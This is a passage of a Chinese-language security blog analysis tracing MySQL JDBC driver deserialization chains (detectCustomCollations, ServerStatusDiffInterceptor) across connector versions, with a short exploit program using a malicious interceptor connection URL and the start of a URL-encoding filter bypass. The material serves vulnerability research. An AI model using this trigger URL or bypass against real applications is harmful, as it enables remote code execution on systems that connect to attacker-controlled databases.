<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    results = stmt.executeQuery(<span class="string">&quot;SHOW COLLATION&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(results.next()) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">collationIndex</span> <span class="operator">=</span> ((Number)results.getObject(<span class="number">3</span>)).intValue();</span><br><span class="line">        <span class="type">String</span> <span class="variable">charsetName</span> <span class="operator">=</span> results.getString(<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (collationIndex &gt;= <span class="number">2048</span> || !charsetName.equals(CharsetMapping.getMysqlCharsetNameForCollationIndex(collationIndex))) &#123;</span><br><span class="line">            ((Map)customCharset).put(collationIndex, charsetName);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>这⾥没有调⽤Util.resultSetToMap⽅法，⽽是改⽤直接调⽤results.getObject(3)，还是会调⽤getObject⽅法，不影响利⽤ 但从mysql-connector-java-5.1.49以后，就不在调⽤results.getObject⽅法，此调⽤链失效</p>
<p>**mysql-connector-java-6.0.2——6.0.6 **</p>
<p>环境：mysql-connector-java-6.0.6 </p>
<p>该版本改⽤com.mysql.cj.jdbc.Driver作为驱动类，所以这⾥定位到com.mysql.jc.jdbc.ConnectionImpl#buildCollationMapping⽅法</p>
<p>发现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((Boolean)<span class="built_in">this</span>.getPropertySet().getBooleanReadableProperty(<span class="string">&quot;detectCustomCollations&quot;</span>).getValue()) &#123;</span><br></pre></td></tr></table></figure>

<p>还是需要扩展参数detectCustomCollations为true</p>
<p>调⽤ResultSetUtil.resultSetToMap⽅法，⽅法内同样调⽤getObject⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">results = stmt.executeQuery(<span class="string">&quot;SHOW COLLATION&quot;</span>);</span><br><span class="line">ResultSetUtil.resultSetToMap(sortedCollationMap, results, <span class="number">3</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>新的ResultSet对象，com.mysql.cj.jdbc.result.ResultSetImpl对象不影响利⽤</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> BIT:</span><br><span class="line">                      <span class="keyword">if</span> (!field.isBinary() &amp;&amp; !field.isBlob()) &#123;</span><br><span class="line">                          <span class="keyword">return</span> field.isSingleBit() ? <span class="built_in">this</span>.getBoolean(columnIndex) : <span class="built_in">this</span>.getBytes(columnIndex);</span><br><span class="line">                      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                          <span class="type">byte</span>[] data = <span class="built_in">this</span>.getBytes(columnIndex);</span><br><span class="line">                          <span class="keyword">if</span> (!(Boolean)<span class="built_in">this</span>.connection.getPropertySet().getBooleanReadableProperty(<span class="string">&quot;autoDeserialize&quot;</span>).getValue()) &#123;</span><br><span class="line">                              <span class="keyword">return</span> data;</span><br><span class="line">                          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                              <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> data;</span><br><span class="line">                              <span class="keyword">if</span> (data != <span class="literal">null</span> &amp;&amp; data.length &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">                                  <span class="keyword">if</span> (data[<span class="number">0</span>] != -<span class="number">84</span> || data[<span class="number">1</span>] != -<span class="number">19</span>) &#123;</span><br><span class="line">                                      <span class="keyword">return</span> <span class="built_in">this</span>.getString(columnIndex);</span><br><span class="line">                                  &#125;</span><br><span class="line"></span><br><span class="line">                                  <span class="keyword">try</span> &#123;</span><br><span class="line">                                      <span class="type">ByteArrayInputStream</span> <span class="variable">bytesIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(data);</span><br><span class="line">                                      <span class="type">ObjectInputStream</span> <span class="variable">objIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bytesIn);</span><br><span class="line">                                      obj = objIn.readObject();</span><br><span class="line">                                      objIn.close();</span><br><span class="line">                                      bytesIn.close();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="ServerStatusDiffInterceptor链"><a href="#ServerStatusDiffInterceptor链" class="headerlink" title="ServerStatusDiffInterceptor链"></a>ServerStatusDiffInterceptor链</h2><p>**mysql-connector-java-5.1.0——5.1.10 **</p>
<p>环境：mysql-connector-java-5.1.10 </p>
<p>在较低的mysql-connector-java版本下是不能利detectCustomCollations链的，原因是ConnectionImpl#buildCollationMapping⽅法下并没有执⾏到ResultSet对象的getObject⽅法 </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sortedCollationMap == <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">    sortedCollationMap = <span class="keyword">new</span> <span class="title class_">TreeMap</span>();</span><br><span class="line"></span><br><span class="line">    stmt = <span class="built_in">this</span>.getMetadataSafeStatement();</span><br><span class="line"></span><br><span class="line">    results = stmt.executeQuery(<span class="string">&quot;SHOW COLLATION&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(results.next()) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">charsetName</span> <span class="operator">=</span> results.getString(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">charsetIndex</span> <span class="operator">=</span> Constants.integerValueOf(results.getInt(<span class="number">3</span>));</span><br><span class="line"></span><br><span class="line">        sortedCollationMap.put(charsetIndex, charsetName);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>那有没有其它的调⽤链能利⽤呢？</p>
<p> 利⽤条件：需要连接后执⾏查询</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select 10086&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> connection.prepareStatement(sql);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> ps.executeQuery();</span><br></pre></td></tr></table></figure>

<p>执⾏完查询后，重点在获取结果位置，跟进executeQuery⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (locallyScopedConn.useMaxRows()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.hasLimitClause) &#123;</span><br><span class="line">        <span class="built_in">this</span>.results = <span class="built_in">this</span>.executeInternal(<span class="built_in">this</span>.maxRows, sendPacket, <span class="built_in">this</span>.createStreamingResultSet(), <span class="literal">true</span>, metadataFromCache, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.maxRows &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.executeSimpleNonQuery(locallyScopedConn, <span class="string">&quot;SET OPTION SQL_SELECT_LIMIT=DEFAULT&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.executeSimpleNonQuery(locallyScopedConn, <span class="string">&quot;SET OPTION SQL_SELECT_LIMIT=&quot;</span> + <span class="built_in">this</span>.maxRows);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.results = <span class="built_in">this</span>.executeInternal(-<span class="number">1</span>, sendPacket, doStreaming, <span class="literal">true</span>, metadataFromCache, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">if</span> (oldCatalog != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.connection.setCatalog(oldCatalog);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.results = <span class="built_in">this</span>.executeInternal(-<span class="number">1</span>, sendPacket, doStreaming, <span class="literal">true</span>, metadataFromCache, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>locallyScopedConn.useMaxRows⽅法默认返回false，会调⽤executeInternal⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">rs = locallyScopedConnection.execSQL(<span class="built_in">this</span>, (String)<span class="literal">null</span>, maxRowsToRetrieve, sendPacket, <span class="built_in">this</span>.resultSetType, <span class="built_in">this</span>.resultSetConcurrency, createStreamingResultSet, <span class="built_in">this</span>.currentCatalog, metadataFromCache, isBatch);</span><br></pre></td></tr></table></figure>

<p>当⽤当前连接对象的execSQL⽅法，也就是ConnetionImpl#execSQL</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="keyword">if</span> (packet == <span class="literal">null</span>) &#123;</span><br><span class="line">         encoding = <span class="literal">null</span>;</span><br><span class="line">         <span class="keyword">if</span> (<span class="built_in">this</span>.getUseUnicode()) &#123;</span><br><span class="line">             encoding = <span class="built_in">this</span>.getEncoding();</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="type">ResultSetInternalMethods</span> <span class="variable">var44</span> <span class="operator">=</span> <span class="built_in">this</span>.io.sqlQueryDirect(callingStatement, sql, encoding, (Buffer)<span class="literal">null</span>, maxRows, resultSetType, resultSetConcurrency, streamResults, catalog, cachedMetadata);</span><br><span class="line">         <span class="keyword">return</span> var44;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<p>跟进sqlQueryDirect⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.statementInterceptors != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ResultSetInternalMethods</span> <span class="variable">interceptedResults</span> <span class="operator">=</span> <span class="built_in">this</span>.invokeStatementInterceptorsPre(query, callingStatement);</span><br><span class="line">        <span class="keyword">if</span> (interceptedResults != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">ResultSetInternalMethods</span> <span class="variable">var12</span> <span class="operator">=</span> interceptedResults;</span><br><span class="line">            <span class="keyword">return</span> var12;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟进invokeStatementInterceptorsPre⽅法</p>
<p><img src="https://baicany.github.io/images/image-20231020161924224.png" alt="image-20231020161924224"></p>
<p>但默认情况下size会为0，看看是怎么控制的 MysqlIO类提供setStatementInterceptors⽅法⽤来设置StatementInterceptors</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">setStatementInterceptors</span><span class="params">(List statementInterceptors)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.statementInterceptors = statementInterceptors;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>⽽在ConnectionImpl类构造⽅法中，在执⾏createNewIO⽅法时实例化了MysqlIO对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.io = <span class="keyword">new</span> <span class="title class_">MysqlIO</span>(newHostPortPair, hostIndex, mergedProps, <span class="built_in">this</span>.getSocketFactoryClassName(), <span class="built_in">this</span>, <span class="built_in">this</span>.getSocketTimeout(), <span class="built_in">this</span>.largeRowSizeThreshold.getValueAsInt());</span><br><span class="line"><span class="built_in">this</span>.io.doHandshake(<span class="built_in">this</span>.user, <span class="built_in">this</span>.password, <span class="built_in">this</span>.database);</span><br></pre></td></tr></table></figure>

<p>⼜刚好触发了MysqlIO对象这个⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.initializeStatementInterceptors();</span><br><span class="line">          <span class="built_in">this</span>.io.setStatementInterceptors(<span class="built_in">this</span>.statementInterceptors);</span><br></pre></td></tr></table></figure>

<p>⽽ConnectionImpl类下的StatementInterceptors可以通过添加扩展参数设置 那么这个参数的值应该为什么呢，⾸先这个类必须实现com.mysql.jdbc.StatementInterceptor接⼝，这⾥选⽤ com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor这个类</p>
<p>那么在invokeStatementInterceptorsPre⽅法中，会调⽤ServerStatusDiffInterceptor#preProcess⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> ResultSetInternalMethods <span class="title function_">preProcess</span><span class="params">(String sql, Statement interceptedStatement, Connection connection)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (connection.versionMeetsMinimum(<span class="number">5</span>, <span class="number">0</span>, <span class="number">2</span>)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.populateMapWithSessionStatusValues(connection, <span class="built_in">this</span>.preExecuteValues);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>驱动版本⼤于5.0.2，调⽤populateMapWithSessionStatusValues⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">populateMapWithSessionStatusValues</span><span class="params">(Connection connection, Map toPopulate)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    java.sql.<span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        toPopulate.clear();</span><br><span class="line">        stmt = connection.createStatement();</span><br><span class="line">        rs = stmt.executeQuery(<span class="string">&quot;SHOW SESSION STATUS&quot;</span>);</span><br><span class="line">        Util.resultSetToMap(toPopulate, rs);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (rs != <span class="literal">null</span>) &#123;</span><br><span class="line">            rs.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>⽅法中调⽤Util.resultSetToMap⽅法，⽅法内触发getObject⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">resultSetToMap</span><span class="params">(Map mappedValues, ResultSet rs)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">while</span>(rs.next()) &#123;</span><br><span class="line">        mappedValues.put(rs.getObject(<span class="number">1</span>), rs.getObject(<span class="number">2</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只需要SHOW SESSION STATUS语句返回的字段1或2的类型为blob，且内容为恶意的序列化数据即</p>
<p>⽤4ra1n师傅做的mysql-fake-server项⽬进⾏利⽤</p>
<p>exp:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.mysql.jdbc.Driver;</span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/mysql?serverTimezone=UTC&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">USERNAME</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(URL, USERNAME, PASSWORD);</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from user&quot;</span>;</span><br><span class="line">        <span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> connection.prepareStatement(sql);</span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">set</span> <span class="operator">=</span> ps.executeQuery();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>**mysql-connector-java-5.1.11——5.x.xx **</p>
<p>环境：mysql-connector-java-5.1.29 </p>
<p>定位到ConnetionImpl#initializePropsFromServer⽅法，跟detectCustomCollations链不同的是，这⾥要利⽤的是loadServerVariables ⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String sqlModeAsString;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.versionMeetsMinimum(<span class="number">3</span>, <span class="number">21</span>, <span class="number">22</span>)) &#123;</span><br><span class="line">    <span class="built_in">this</span>.loadServerVariables();</span><br></pre></td></tr></table></figure>

<p>跟进loadServerVariables方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.serverVariables = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    results = stmt.executeQuery(query);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(results.next()) &#123;</span><br><span class="line">        <span class="built_in">this</span>.serverVariables.put(results.getString(<span class="number">1</span>), results.getString(<span class="number">2</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    results.close();</span><br><span class="line">    results = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>

<p>这里并没有触发getboject跟进executeQuery</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="built_in">this</span>.statementBegins();</span><br><span class="line">                            <span class="built_in">this</span>.results = locallyScopedConn.execSQL(<span class="built_in">this</span>, sql, -<span class="number">1</span>, (Buffer)<span class="literal">null</span>, <span class="built_in">this</span>.resultSetType, <span class="built_in">this</span>.resultSetConcurrency, doStreaming, <span class="built_in">this</span>.currentCatalog, cachedFields);</span><br><span class="line">                        &#125;</span><br></pre></td></tr></table></figure>

<p>所以5.1.0——5.1.10版本的查询语句也可以是这样</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement();</span><br><span class="line">statement.executeQuery(<span class="string">&quot;select * from user&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这⾥是在查询时触发反序列化，⽽上⾯是获取结果处触发</p>
<p>**mysql-connector-java-6.x **</p>
<p>跟上⾯5.1.11——5.x.xx完全相同，仅换了驱动包包名，为com.mysql.cj.jdbc</p>
<p><strong>mysql-connector-java-8.0.7——8.0.20</strong> </p>
<p>环境：mysql-connector-java-8.0.12 </p>
<p>定位到ConnetionImpl类initializePropsFromServer⽅法，可以发现，已经不是调⽤当前对象的loadServerVariables和 buildCollationMapping⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.session.setSessionVariables();</span><br><span class="line"><span class="built_in">this</span>.session.loadServerVariables(<span class="built_in">this</span>.getConnectionMutex(), <span class="built_in">this</span>.dbmd.getDriverVersion());</span><br><span class="line"><span class="built_in">this</span>.autoIncrementIncrement = <span class="built_in">this</span>.session.getServerSession().getServerVariable(<span class="string">&quot;auto_increment_increment&quot;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="built_in">this</span>.session.buildCollationMapping();</span><br></pre></td></tr></table></figure>

<p>但其中调⽤了的handleAutoCommitDefaults⽅法可以利⽤</p>
<p><img src="https://baicany.github.io/images/image-20231025201132763.png" alt="image-20231025201132763"></p>
<p>handleAutoCommitDefaults⽅法中，resetAutoCommitDefault会被赋值为true，会调⽤setAutoCommit⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (resetAutoCommitDefault) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.setAutoCommit(<span class="literal">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException var5) &#123;</span><br><span class="line">        <span class="keyword">if</span> (var5.getErrorCode() != <span class="number">1820</span> || (Boolean)<span class="built_in">this</span>.disconnectOnExpiredPasswords.getValue()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var5;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>handleAutoCommitDefaults⽅法中，resetAutoCommitDefault会被赋值为true，会调⽤setAutoCommit⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (needsSetOnServer) &#123;</span><br><span class="line">    <span class="built_in">this</span>.session.execSQL((Query)<span class="literal">null</span>, autoCommitFlag ? <span class="string">&quot;SET autocommit=1&quot;</span> : <span class="string">&quot;SET autocommit=0&quot;</span>, -<span class="number">1</span>, (NativePacketPayload)<span class="literal">null</span>, <span class="literal">false</span>, <span class="built_in">this</span>.nullStatementResultSetFactory, <span class="built_in">this</span>.database, (ColumnDefinition)<span class="literal">null</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进execSQL</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    var24 = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (packet == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">encoding</span> <span class="operator">=</span> (String)<span class="built_in">this</span>.characterEncoding.getValue();</span><br><span class="line">        var30 = ((NativeProtocol)<span class="built_in">this</span>.protocol).sendQueryString(callingQuery, query, encoding, maxRows, streamResults, catalog, cachedMetadata, <span class="built_in">this</span>::getProfilerEventHandlerInstanceFunction, resultSetFactory);</span><br><span class="line">        var24 = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">break</span> label222;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟上⾯不同，调⽤的对象不同了，这⾥要利⽤的是sendQueryString⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.sendQueryPacket(callingQuery, sendPacket, maxRows, streamResults, catalog, cachedMetadata, getProfilerEventHandlerInstanceFunction, resultSetFactory);</span><br></pre></td></tr></table></figure>

<p>⽅法最后调⽤了sendQueryPacket⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.queryInterceptors != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">T</span> <span class="variable">interceptedResults</span> <span class="operator">=</span> <span class="built_in">this</span>.invokeQueryInterceptorsPre(query, callingQuery, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">if</span> (interceptedResults != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Resultset</span> <span class="variable">var41</span> <span class="operator">=</span> interceptedResults;</span><br><span class="line">            <span class="keyword">return</span> var41;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟上⾯的invokeStatementInterceptorsPre很像，跟进invokeQueryInterceptorsPre⽅法看看 但需要保证queryInterceptors不为null，看看怎么控制 位于ConnetionImpl#connectOneTryOnly⽅法处，逻辑跟上⾯差不多，还是可以通过扩展参数设置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.session.setQueryInterceptors(<span class="built_in">this</span>.queryInterceptors);</span><br><span class="line"><span class="built_in">this</span>.initializePropsFromServer();</span><br></pre></td></tr></table></figure>

<p>这样就能进⼊invokeQueryInterceptorsPre⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">s</span> <span class="operator">=</span> <span class="built_in">this</span>.queryInterceptors.size(); i &lt; s; ++i) &#123;</span><br><span class="line">    <span class="type">QueryInterceptor</span> <span class="variable">interceptor</span> <span class="operator">=</span> (QueryInterceptor)<span class="built_in">this</span>.queryInterceptors.get(i);</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">executeTopLevelOnly</span> <span class="operator">=</span> interceptor.executeTopLevelOnly();</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">shouldExecute</span> <span class="operator">=</span> executeTopLevelOnly &amp;&amp; (<span class="built_in">this</span>.statementExecutionDepth == <span class="number">1</span> || forceExecute) || !executeTopLevelOnly;</span><br><span class="line">    <span class="keyword">if</span> (shouldExecute) &#123;</span><br><span class="line">        <span class="type">T</span> <span class="variable">interceptedResultSet</span> <span class="operator">=</span> interceptor.preProcess(sql, interceptedQuery);</span><br><span class="line">        <span class="keyword">if</span> (interceptedResultSet != <span class="literal">null</span>) &#123;</span><br><span class="line">            previousResultSet = interceptedResultSet;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>逻辑跟上⾯差不多，调⽤了preProcess⽅法，设置queryInterceptors为com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T <span class="keyword">extends</span> <span class="title class_">Resultset</span>&gt; T <span class="title function_">preProcess</span><span class="params">(Supplier&lt;String&gt; sql, Query interceptedQuery)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.populateMapWithSessionStatusValues(<span class="built_in">this</span>.preExecuteValues);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进populateMapWithSessionStatusValues⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">stmt = <span class="built_in">this</span>.connection.createStatement();</span><br><span class="line">rs = stmt.executeQuery(<span class="string">&quot;SHOW SESSION STATUS&quot;</span>);</span><br><span class="line">ResultSetUtil.resultSetToMap(toPopulate, rs);</span><br></pre></td></tr></table></figure>

<p>ResultSetUtil.resultSetToMap⽅法内执⾏了getObject⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">resultSetToMap</span><span class="params">(Map mappedValues, ResultSet rs)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">while</span>(rs.next()) &#123;</span><br><span class="line">        mappedValues.put(rs.getObject(<span class="number">1</span>), rs.getObject(<span class="number">2</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Bypass 环境：</p>
<p>mysql-connector-java-8.0.12 </p>
<p>Urlencode 协议头</p>
<p>Urlencode 逻辑位于com.mysql.cj.conf.ConnetionUrlParser#isConnectionStringSupported⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isConnectionStringSupported</span><span class="params">(String connString)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (connString == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (WrongArgumentException)ExceptionFactory.createException(WrongArgumentException.class, Messages.getString(<span class="string">&quot;ConnectionString.0&quot;</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">matcher</span> <span class="operator">=</span> SCHEME_PTRN.matcher(connString);</span><br><span class="line">        <span class="keyword">return</span> matcher.matches() &amp;&amp; Type.isSupported(decode(matcher.group(<span class="string">&quot;scheme&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现这里会调用异地decode方法就是urldecode</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">decode</span><span class="params">(String text)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isNullOrEmpty(text)) &#123;</span><br><span class="line">        <span class="keyword">return</span> text;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> URLDecoder.decode(text, StandardCharsets.UTF_8.name());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException var2) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>path部分Urlencode 逻辑位于com.mysql.cj.conf.ConnectionUrlParser#parseConnectionString⽅法</p>
